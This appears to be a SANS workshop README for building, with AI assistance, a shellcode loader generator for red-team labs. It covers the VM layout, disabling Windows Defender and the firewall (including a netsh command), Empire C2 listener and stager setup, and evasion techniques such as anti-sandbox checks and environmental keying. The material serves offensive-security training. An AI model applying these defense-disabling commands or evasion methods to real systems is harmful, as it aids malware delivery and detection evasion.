# SANS Workshop: AI-Assisted Shellcode Loader Generator

Vibe coding workshop — using AI (Google Antigravity / LLM of choice) to iteratively build a Dockerized shellcode loader generator with configurable evasion techniques. Follows the **"think then act"** methodology: PRD first, then phase-by-phase implementation with verification at each step.

## Workshop Objectives

- Apply the "think then act" methodology for AI-assisted security tool development
- Write effective prompts that minimize LLM hallucinations using explicit constraints and concrete examples
- Create a Product Requirements Document (PRD) for custom security tooling using AI
- Implement common evasion techniques: payload bloating, sleep delays, anti-sandbox checks, and environmental keying
- Understand the difference between in-process shellcode execution and process injection techniques
- Verify AI-generated P/Invoke signatures against authoritative sources ([pinvoke.net](http://pinvoke.net))

## Lab Architecture

```
┌─────────────────────────────────────────────────────────┐
│                   HOST MACHINE (Windows)                │
│                      32GB RAM                           │
│                                                         │
│  ┌───────────────────────────────────────────────────┐  │
│  │            Google Antigravity IDE                 │  │
│  │         (AI-assisted development)                 │  │
│  │                                                   │  │
│  │  Code written here → transferred to Parrot VM     │  │
│  │  via shared folder / git / scp                    │  │
│  └───────────────────────────────────────────────────┘  │
│                                                         │
│  VMware Workstation                                     │
│  ┌───────────────────┐       ┌──────────────────────┐   │
│  │   Parrot Sec VM   │       │   Windows 10 VM      │   │
│  │   (Attacker)      │       │   (Target)           │   │
│  │                   │       │                      │   │
│  │ - Empire C2       │       │ - Defender OFF       │   │
│  │ - Docker          │       │ - Firewall OFF       │   │
│  │ - Shellcode Loader│       │ - Payload execution  │   │
│  │   Generator (app) │       │ - Agent callbacks    │   │
│  │                   │       │                      │   │
│  │ NIC 1: NAT        │       │ NIC 1: NAT           │   │
│  │ NIC 2: VMnet1     │◄─────►│ NIC 2: VMnet1        │   │
│  │  (Host-Only)      │       │  (Host-Only)         │   │
│  └───────────────────┘       └──────────────────────┘   │
│                                                         │
│         VMnet1 Host-Only Network (192.168.x.0/24)       │
└─────────────────────────────────────────────────────────┘
```

### Workflow

1. Write/generate code in **Antigravity** on the host machine
2. Transfer project to **Parrot VM** → build and run Docker container
3. **Empire C2** on Parrot generates raw shellcode
4. The **loader generator** (Dockerized web app) wraps shellcode with evasion techniques into a C# payload
5. Test the payload on the **Windows VM** — shellcode executes and calls back to Empire over the Host-Only network

## Setup Instructions

### 1. Google Antigravity (Host Machine)

The AI-assisted IDE where all the coding happens. Runs on the host, not inside any VM.

**Install (Windows):**

Download the `.exe` installer from [antigravity.google/download](https://antigravity.google/download) and run it.

**Install (Linux):**

```bash
# Debian/Ubuntu — APT repo
curl -fsSL https://us-central1-apt.pkg.dev/doc/repo-signing-key.gpg | sudo gpg --dearmor -o /etc/apt/keyrings/antigravity-repo-key.gpg

echo "deb [signed-by=/etc/apt/keyrings/antigravity-repo-key.gpg] https://us-central1-apt.pkg.dev/projects/antigravity-auto-updater-dev/ antigravity-debian main" | sudo tee /etc/apt/sources.list.d/antigravity.list > /dev/null

sudo apt update && sudo apt install antigravity

# Or standalone: download .deb from antigravity.google/download/linux
# sudo dpkg -i antigravity-*.deb
```

**First launch config:**

- Import VS Code/Cursor settings or start fresh
- Select **Agent-assisted development** mode (you drive, AI assists)
- Sign in with a **personal Gmail account** (Workspace accounts not supported in preview)
- Gemini 3 Pro is included free — no API keys needed

### 2. VMware Networking (Host-Only)

Both VMs need to communicate over a private network for C2 callbacks.

**Verify/create the Host-Only network:**

1. In VMware Workstation: **Edit → Virtual Network Editor**
2. Click **Change Settings** (requires admin)
3. Confirm **VMnet1** exists and is set to **Host-Only**
4. Note the subnet (e.g., `192.168.x.0/24`) — DHCP is on by default, which is fine

**Add a second NIC to each VM:**

For both the Parrot and Windows VMs:

1. **VM → Settings → Hardware → Add → Network Adapter**
2. Set the new adapter to **Custom: VMnet1**
3. Leave the existing NAT adapter alone (needed for internet access)

### 3. Parrot VM (Attacker Machine)

Any Debian-based pentest distro works (Parrot, Kali, etc.) — Empire officially supports ParrotOS. It is also what I have currently installed and I am sort of lazy to change it.

**VM specs (existing daily driver):** Just add the second Host-Only NIC as described above.

**Verify Docker is installed:**

```bash
docker --version

# If not installed:
sudo apt update
sudo apt install -y docker.io docker-compose
sudo usermod -aG docker $USER
# Log out and back in
```

**Install Empire C2 (Docker — recommended):**

```bash
docker pull bcsecurity/empire:latest

docker run -it \
  -p 1337:1337 \
  -p 5000:5000 \
  bcsecurity/empire:latest
```

Port 1337 = REST API, Port 5000 = Starkiller web GUI.

> **Note:** Empire 6.0+ requires Python 3.13 for native install. Docker sidesteps this entirely and keeps Empire isolated from your Parrot system packages.

**Run the CLI client against the running server:**

```bash
docker container ls   # grab the container ID
docker exec -it <container-id> ./ps-empire client
```

### 4. Windows 10 VM (Target)

The victim machine where generated payloads are tested.

**ISO:** Download the free 90-day evaluation from [Microsoft Evaluation Center](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise) (Windows 10 Enterprise, 64-bit).

**VM specs:**

| Resource | Recommended |
|----------|-------------|
| RAM | 8 GB |
| CPU | 1 processor × 4 cores |
| Disk | 100 GB (thin provisioned) |
| NIC 1 | NAT (internet access) |
| NIC 2 | VMnet1 Host-Only (lab network) |

**Post-install — disable all defenses:**

Windows Defender:
- Windows Security → Virus & threat protection → Manage settings
- Turn off: Real-time protection, Cloud-delivered protection, Automatic sample submission, Tamper protection

Windows Firewall:
- Windows Security → Firewall & network protection → Turn off for all profiles

Or via elevated cmd:
```
netsh advfirewall set allprofiles state off
```

**Take a VMware snapshot here** — clean baseline before installing any additional tools.

### 5. Verify Connectivity

From **Parrot**, note the Host-Only IP:
```bash
ip a   # look for the VMnet1 adapter IP, e.g., 192.168.x.128
```

From **Windows**, note the Host-Only IP:
```
ipconfig   # look for the second Ethernet adapter, e.g., 192.168.x.129
```

Test both directions:
```bash
# From Parrot
ping 192.168.x.129

# From Windows
ping 192.168.x.128
```

Both should succeed. If Windows doesn't respond, the firewall isn't fully disabled.

### 6. Empire Smoke Test (Optional)

Quick end-to-end verification that C2 callbacks work across the lab network.

**On Parrot (Empire client):**

```
uselistener http
set Host http://<PARROT_HOST_ONLY_IP>:80
set Port 80
execute

usestager multi/launcher
set Listener http
generate
```

Copy the generated PowerShell one-liner. Run it on the Windows VM. You should see an agent check in on the Empire console.

## Evasion Techniques Covered

The workshop builds a web app that generates C# payloads with configurable options:

| Technique | Description |
|-----------|-------------|
| **Payload bloating** | Inflate binary size to evade sandbox file-size limits |
| **Sleep delays** | Delay execution to outlast sandbox analysis timeouts |
| **Anti-sandbox checks** | Detect VM/sandbox artifacts before executing payload |
| **Environmental keying** | Only execute if specific environment conditions are met (hostname, domain, username, etc.) |
| **Entropy reduction** | Reduce entropy of the binary to avoid statistical detection |

## Tools & Resources

- [Google Antigravity](https://antigravity.google/) — Agent-first AI IDE
- [Empire C2 (BC Security)](https://github.com/BC-SECURITY/Empire) — Post-exploitation framework
- [Starkiller](https://github.com/BC-SECURITY/Starkiller) — Empire web GUI
- [pinvoke.net](http://pinvoke.net) — Win32 P/Invoke signature reference
- [Microsoft Evaluation Center](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise) — Free Windows 10 ISOs
